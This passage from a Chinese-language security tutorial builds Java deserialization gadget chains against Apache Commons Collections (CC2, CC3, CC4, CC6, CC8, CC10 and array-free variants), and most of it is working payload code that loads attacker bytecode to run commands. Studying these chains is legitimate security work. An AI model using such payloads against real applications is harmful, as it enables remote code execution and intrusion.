    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

我们需要让这个方法执行到 `_class[i] = loader.defineClass(_bytecodes[i]);` 处再正常返回, 我们需要扫平一些障碍.

例如他调用了 `_tfactory.getExternalExtensionsMap()`, 我们需要让 `_tfactory` 不为 null

但是我们注意到 `_tfactory` 是一个 transient

```java
private transient TransformerFactoryImpl _tfactory = null;
```

他并不会被反序列化. 但是我们不必惊慌, 因为在 `readObject` 中已经对其进行赋值. 我们可以不用对其赋值, 但是在测试的时候我们还是先赋值吧. 在序列化的时候就可以不用对其赋值.

接下来就能够走到我们通过 `_bytecodes` 加载类的地方了

我们可以尝试写一下:

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

// Field tfactoryField = templates.getClass().getDeclaredField("_tfactory");
// tfactoryField.setAccessible(true);
// tfactoryField.set(templates, new TransformerFactoryImpl());

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);

templates.newTransformer();
```

但是此时报错了, 在 `defineTransletClasses` 中, 运行到了:

![image-20250126040450893](https://s2.loli.net/2025/01/26/zCsb8EdV26KJvWp.png)

但是此时 `_auxClasses` 为 null 所以抛出异常, 此时我们可以有两种思路, 第一种是给 `_auxClasses` 赋一个初值, 第二个是让他不走到这个 else 分支里面去.

### 第一种思路

我们可以看到前面有一段给 `_auxClasses` 赋值的代码:

```java
final int classCount = _bytecodes.length;
// ... 
if (classCount > 1) {
    _auxClasses = new HashMap<>();
}
```

这需要我们的 `classCount` > 1, 而这里正好是根据 `_bytecodes` 的长度来的, 由于我们可以控制 `_bytecodes` , 故使其长度大于 1 便可 `_auxClasses` 恒有值

所以我们 `_bytecodes` 需要有两个元素, 同时我们也注意到 `_transletIndex` 也因为没有继承而变为 `-1`, 故我们再通过反射修改此值

```java
TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

// Field tfactoryField = templates.getClass().getDeclaredField("_tfactory");
// tfactoryField.setAccessible(true);
// tfactoryField.set(templates, new TransformerFactoryImpl());

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);

Field transletIndexField = templates.getClass().getDeclaredField("_transletIndex");
transletIndexField.setAccessible(true);
transletIndexField.set(templates, 0);

return templates;
```



### 第二种思路

但是我们再看后面有 `_transletIndex < 0` 的判断, 此时也会抛出错误, 所以我们干脆采用第二种方法.

为了满足 if, 此时需要我们的 `_byteCode` 中字节码的类继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`

我们稍微改造一下我们的恶意类:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class ExecExploit extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        
    }
}
```

此时再进行编译可以看到已经能够成功执行了.

此时我们就已经形成了**执行可序列化类的公共方法**了, 当然我们可以在这里利用 InvokerTransformer 来调用一下.

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
};
Transformer transformerChain = new ChainedTransformer(transformers);
transformerChain.transform(null);
```

于是乎这里就可以利用上之前的几个 CC 链的东西了.

例如我们在这里接上 CC6 的最后的 Payload 为:

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes, HelloWorldExploit()};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);

Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
};
ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");

// tweak
Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

evilMap.remove("kengwang");

return expMap;
```

当然你也可以接上其他的链子



### 没新意?

当然, 如果到这里就结束的话那真的没什么新意. 绕来绕去又回到了 `InvokerTransformer`, 如果他把 `InvokerTransformer` 禁用了呢?

我们再往下走一点吧.

我们浏览了一圈, 都没有看到可序列化的类在 `readObject` 内间接调用了的, 难道就要前功尽弃了吗? 不过, 似乎有一处不太一样. 我们关注到 `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`, 他是在构造函数里面调用的.

构造函数, 不可序列化? 这不禁让我们想到了 `Runtime`, 他并不是可序列化的, 但是我们用了 `Runtime.class` 来通过反射进行了获取实例. 再明确一下, 这里我们需要的是拿到 `TrAXFilter` 这个类, 调用其构造函数.

下面, 隆重介绍 `InstantiateTransformer`

```java
public class InstantiateTransformer implements Transformer, Serializable {
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    
    public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException( ... );
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);

        } catch ( ... ) { ... }
    }
}
```

于是我们就可以利用这个来进行创建:

```java
import javax.xml.transform.Templates;


Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
};
Transformer transformerChain = new ChainedTransformer(transformers);
```

此时我们完全摆脱了 `InvokerTransformer`, 前面可以替换成我们之前所见过的很多的 CC 链子了.

记得我们之前说的吗? 在序列化的时候可以去掉 `_tfactory` 的初始化.

至此, 我们得到了第二个可用的 `Transformer`, 这个 `Transformer` 可以替换之前的链子尾部的 `Transformer`

例如我们可以套上 CC6, 用 phith0n 改进版的链子:

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(new Class[]{ Templates.class }, new Object[]{ templates }),
};
ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");

Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

evilMap.remove("kengwang");

serialize(evilMap);
deserialize();
```

至此, 我们已经将链尾的两个 Transformer 给弄好了

## CommonsCollections10

我们可以再看看我们的 `LazyMap`, 我们的 `LazyMap` 其实可以使用 `Factory`

```java
protected LazyMap(Map map, Factory factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = FactoryTransformer.getInstance(factory);
}
```

他会将 Factory 包装成 `Transformer`, 我们可以来找找有哪些可用的 `Factory`

可以通过简单的找寻发现 `InstantiateFactory`, 他可以调用我们的构造方法. 这个不正是我们 `InstantiateTransformer` 所干的事情吗?

于是我们可以通过这个 Factory 套上 `FactoryTransformer` 来替换掉 `InstantiateTransformer`

我们看看需要给这个 `InstantiateFactory` 传些什么:

* classToInstantiate (Class): 要初始化的类, 这边我们使用 `TrAXFilter`
* paramTypes (Class[]): 参数类型, 这里是 `new Class[]{Templates.class}`
* args (Object[]): 传入的参数, 这边传入我们构造好的 Template

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);


Factory f = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
Transformer factoryTransformer = FactoryTransformer(f);

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");

Field field = LazyMap.class.getDeclaredField("factory");
field.setAccessible(true);
field.set(lazyMap, factoryTransformer);


evilMap.remove("kengwang");

serialize(evilMap);
deserialize();
```





## Rebuild!

我们之前所讨论的所有的 CC 都是基于 `commons-collections:commons-collections`来实现的, 其实 Apache 还同时维护另一个大版本的 CC: `org.apache.commons:commons-collections4`, 这两个版本可以在同一项目中共存, 各自在不同的 Namespace 下, 同时代码逻辑也有些许不同. 对于这些不同我们需要对我们的链子做一些调整.

> [!TIP]
>
> 注意我们以下的依赖都为 `org.apache.commons:commons-collections4:4.0`
>
> 在 commons-collections4:4.1 之后这些 Transformer 都没有实现 Serializable 接口导致无法被反序列化

## CommonsCollections6 - Rebuild

我们的 CC6 链子在 `commons-collections4:4.0`  上也是存在的, 但是 LazyMap 有一个变动

`LazyMap#decorate` 方法并不存在了, 这个时候就需要我们换一个方法来创建 LazyMap 了

我们可以看到旧版的 `LazyMap#decorate` 实际上是创建了一个新的 `LazyMap`

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

我们可以找到一个新方法 `LazyMap.lazyMap` 来达到同样的目的, 于是对于 `commons-collections4:4.0`

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

Map evilMap = new HashMap();
Map lazyMap =  LazyMap.lazyMap(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");

// tweak
Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

evilMap.remove("kengwang");

return expMap;

```



## CommonsCollections2 - 再下一城!

> Found by: frohof
>
> 依赖: `org.apache.commons:commons-collections4:4.0`


我们需要从头再找一条链子出来, 触发点我们还是用 `Transformer.transform` 

还记得我们找链子的方法吗? 要找到调用到了 `transform` 方法的类, 最终能够通过可以 `Serialize` 的类层层回到 `readObject`

最后我们找到了 `java.utils.PriorityQueue`, 他可以通过 `readObject` 中调用的 `heapify` 来到 `siftDown` 走到 `siftDownUsingComparator` 最终能够到达 `org.apache.commons.collections4.comparators.TransformingComparator#compare()`, 我们发现相交于 `commons-collections:3`, 在 `commons-collections4` 的里面 `TransformingComparator` 实现了 `Serializeable` 接口

接下来我们该满足中途的条件了

注意到 `heapify` 中存在这样的判断条件:

```java
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

我们要走到里面需要让 `i` 要大于等于 0, 也就是需要 `size` 在右移一位(除以2) 后 - 1 要大于 0(`size / - 1 >= 0`), 则我们的 size 需要大于等于 `2`

于是我们两种方法:

* 第一种我们直接加两个元素进去

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
    new ConstantTransformer(1)
};

ChainedTransformer transformer = new ChainedTransformer(transformers);

TransformingComparator transformingComparator = new TransformingComparator(transformer);
PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);

// Method 1: add two elements
priorityQueue.add(1);
priorityQueue.add(1);

return priorityQueue;
```



* 第二种反射改掉 size, 将其改为 2

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
    new ConstantTransformer(1)
};

ChainedTransformer transformer = new ChainedTransformer(transformers);

TransformingComparator transformingComparator = new TransformingComparator(transformer);
PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);

// Method 2: use reflection to tweak the size of the queue
Field queueField = PriorityQueue.class.getDeclaredField("size");
queueField.setAccessible(true);
queueField.set(priorityQueue, 2);

return priorityQueue;
```



## CommonsCollections4 - 小修小补

> Found by: frohof
>
> 依赖: `org.apache.commons:commons-collections4:4.0`

CC2 中我们 Sink 的点为 `InvokerTransformer`, 我们也可以转变为 `InstantiateTransformer`, 拼上 CC3 最后半段的触发链即可

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field tfactoryField = templates.getClass().getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(new Class[]{ Templates.class }, new Object[]{ templates }),
};
ChainedTransformer transformer = new ChainedTransformer(transformers);

TransformingComparator transformingComparator = new TransformingComparator(transformer);
PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);

// Method 1: add two elements
priorityQueue.add(1);
priorityQueue.add(1);

return priorityQueue;
```

注意一个小问题, 相较于 CC3, 此时并没有走到 `TemplatesImpl.readObject`, 导致 `_tfactory` 并不会被初始化, 我们还是需要在构造时对其初始化.

## CommonsCollections8 - 

> Found by: navalorenzo
>
> Refer: https://github.com/frohoff/ysoserial/pull/116

我们在刚才的 `CC2/CC4` 中通过调用到 `TransformingComparator#compare` 方法来调用 `transform` 方法, 我们是通过 `PriorityQueue` 来走到这里的, 那我们有没有其他的也能够调用到呢?

我们可以找到了 `java.utils.TreeMap`, 在其的 `compare` 中进行了调用, 而在其的 `put` 方法中也调用到了这个 `compare`

```java
public V put(K key, V value) {
        // ...ommitted...
        Comparator<? super K> cpr = comparator;
        if (cpr != null) {
            do {
                parent = t;
                cmp = cpr.compare(key, t.key);
                if (cmp < 0)
                    t = t.left;
                else if (cmp > 0)
                    t = t.right;
                else
                    return t.setValue(value);
            } while (t != null);
        }
        // ...ommitted...
    }
```



我们可以再往上找一层, 我们可以跟到 `org.apache.commons.collections4.bag.TreeBag`, 

在其中的 `readObject` 中可以找到 

```java
private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    final Comparator<? super E> comp = (Comparator<? super E>) in.readObject();
    super.doReadObject(new TreeMap<E, MutableInteger>(comp), in);
}
```

其在反序列化时会构建这样一个 `TreeMap`, 同时也会到其基类上做一次 `doReadObject` 最终可以调用到 `put` 方法

```java
protected void doReadObject(final Map<E, MutableInteger> map, final ObjectInputStream in)
        throws IOException, ClassNotFoundException {
    this.map = map;
    final int entrySize = in.readInt();
    for (int i = 0; i < entrySize; i++) {
        final E obj = (E) in.readObject();
        final int count = in.readInt();
        map.put(obj, new MutableInteger(count));
        size += count;
    }
}
```

于是我们的链子可以接起来了

但是在构造的时候我们需要注意一下, 在调用 `treeBag#add` 的时候会走到 `AbstractMapBag#add` , 此处会走到 `Map.put` 导致会出现一些不好的问题

我们可以参照原作者的方法, 我们先将 Transformer 的 `methodName` 换成无害的 `toString`, 在之后再换成 `newTransformer`

```java 
// templates 复用上面的就可以了

Transformer fakerTransformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
TransformingComparator cpr = new TransformingComparator(fakerTransformer);
TreeBag treeBag = new TreeBag(cpr);
treeBag.add(templates);


Field field = fakerTransformer.getClass().getDeclaredField("iMethodName");
field.setAccessible(true);
field.set(fakerTransformer, "newTransformer");

return treeBag;
```

## 无数组改造

在我们之前的都用到了 `ChainedTransformer`, 其中包含了 `Transformer` 数组, 但是在某些特殊的情况下 (Shiro-550) 可能不支持数组, 这个时候我们就需要改造一些无数组的利用.

其实我们很容易发现之前我们滥用了 `ConstantTransformer` 将写死的变量作为了起始, 所以我们可以将这个起始点放到 key 里面, 这样我们只需要第二个 `InvokerTransformer` 了

### CC6

我们用 `TiedMapEntry` 做例子, 改造一下 `CC6`

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Transformer transformer = new InvokerTransformer("newTransformer", null, null);
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");
evilMap.clear();

// tweak
Field f = LazyMap.class.getDeclaredField("factory");
f.setAccessible(true);
f.set(lazyMap, transformer);

return expMap;
```

### CC2

同样的, 我们也可以微调一下 CC2

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
byte[][] byteCodes = new byte[][]{bytes};

TemplatesImpl templates = new TemplatesImpl();

Field nameField = templates.getClass().getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "kengwang");

Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
bytecodesField.set(templates, byteCodes);

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Transformer transformer = new InvokerTransformer("newTransformer", null, null);

TransformingComparator transformingComparator = new TransformingComparator(fakeChain);
PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);

priorityQueue.add(templates);
priorityQueue.add(templates);

// tweak
Field f = TransformingComparator.class.getDeclaredField("transformer");
f.setAccessible(true);
f.set(transformingComparator, transformer);

return priorityQueue;
```





## 参考资料

* [CommonsCollections反序列化 by 白日梦组长](https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805)
* [Java安全漫谈 系列文章 by phith0n](https://t.zsxq.com/k1qHu)
* [CommonsCollections by Whoopsunix](https://whoopsunix.com/docs/category/commonscollections)